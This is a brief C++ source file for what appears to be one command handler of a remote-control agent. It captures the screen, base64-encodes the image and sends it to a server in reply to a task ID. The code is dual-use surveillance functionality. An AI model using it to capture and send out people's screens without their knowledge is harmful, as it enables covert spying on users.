#include "pch.h"
#include "get_screenshot.h"
#include"handlers/screenshot.h"
#include "../connection/client.h"
#include <fstream>
#include<cpp-base64/base64.h>
get_screenshot::get_screenshot(string _taskId) {
	taskId = std::move(_taskId);
}

void get_screenshot::execute() {
	ScreenShotSave(L"shot.bmp");
	ifstream infile("shot.bmp",ios::binary);
	infile.seekg(0, std::ios::end);
	size_t size = infile.tellg();
	infile.seekg(0, ios::beg);
	char * tmp = (char *)malloc(sizeof(char) * size);
	infile.read(tmp, size);
	
	string b64ed = base64_encode((unsigned char const*)tmp, size,false);

	client::instance->sendPacket(
		response{ finished, taskId, b64ed }.dump());
}